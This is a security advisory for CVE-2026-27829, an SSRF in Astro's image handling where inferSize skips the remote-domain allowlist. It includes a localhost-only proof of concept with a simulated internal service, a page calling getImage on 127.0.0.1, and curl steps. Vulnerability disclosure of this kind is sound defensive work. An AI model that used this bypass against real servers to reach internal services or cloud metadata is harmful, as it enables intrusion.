# [M] Astro is vulnerable to SSRF due to missing allowlist enforcement in remote image inferSize

## Summary
Severity: Medium
Advisory: GHSA-cj9f-h6r6-4cx2
CVE: CVE-2026-27829
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-02-25
Source: https://github.com/advisories/GHSA-cj9f-h6r6-4cx2
Type: github-advisory

## Affected
- npm: `@astrojs/node` — affected >=9.0.0 <9.5.4

## Details
## Summary

A bug in Astro's image pipeline allows bypassing `image.domains` / `image.remotePatterns` restrictions, enabling the server to fetch content from unauthorized remote hosts.

## Details

Astro provides an `inferSize` option that fetches remote images at render time to determine their dimensions. Remote image fetches are intended to be restricted to domains the site developer has manually authorized (using the `image.domains` or `image.remotePatterns` options).

However, when `inferSize` is used, no domain validation is performed — the image is fetched from any host regardless of the configured restrictions. An attacker who can influence the image URL (e.g., via CMS content or user-supplied data) can cause the server to fetch from arbitrary hosts.

## PoC

<details>

### Setup

Create a new Astro project with the following files:

`package.json`:
```json
{
  "name": "poc-ssrf-infersize",
  "private": true,
  "scripts": {
    "dev": "astro dev --port 4322",
    "build": "astro build"
  },
  "dependencies": {
    "astro": "5.17.2",
    "@astrojs/node": "9.5.3"
  }
}
```

`astro.config.mjs` — only `localhost:9000` is authorized:
```javascript
import { defineConfig } from 'astro/config';
import node from '@astrojs/node';

export default defineConfig({
  output: 'server',
  adapter: node({ mode: 'standalone' }),
  image: {
    remotePatterns: [
      { hostname: 'localhost', port: '9000' }
    ]
  }
});
```

`internal-service.mjs` — simulates an internal service on a non-allowlisted host (`127.0.0.1:8888`):
```javascript
import { createServer } from 'node:http';
const GIF = Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64');
createServer((req, res) => {
  console.log(`[INTERNAL] Received: ${req.method} ${req.url}`);
  res.writeHead(200, { 'Content-Type': 'image/gif', 'Content-Length': GIF.length });
  res.end(GIF);
}).listen(8888, '127.0.0.1', () => console.log('Internal service on 127.0.0.1:8888'));
```

`src/pages/test.astro`:
```astro
---
import { getImage } from 'astro:assets';

const result = await getImage({
  src: 'http://127.0.0.1:8888/internal-api',
  inferSize: true,
  alt: 'test'
});
---
<html><body>
  <p>Width: {result.options.width}, Height: {result.options.height}</p>
</body></html>
```

### Steps to reproduce

1. Run `npm install` and start the internal service:

```bash
node internal-service.mjs
```

2. Start the dev server:

```bash
npm run dev
```

3. Request the page:

```bash
curl http://localhost:4322/test
```

4. `internal-service.mjs` logs `Received: GET /internal-api` — the request was sent to `127.0.0.1:8888` despite only `localhost:9000` being in the allowlist.

</details>

## Impact

Allows bypassing `image.domains` / `image.remotePatterns` restrictions to make server-side requests to unauthorized hosts. This includes the risk of server-side request forgery (SSRF) against internal network services and cloud metadata endpoints.

## References
- https://github.com/withastro/astro/security/advisories/GHSA-cj9f-h6r6-4cx2
- https://nvd.nist.gov/vuln/detail/CVE-2026-27829
- https://github.com/withastro/astro/commit/e01e98b063e90d274c42130ec2a60cc0966622c9
- https://github.com/withastro/astro
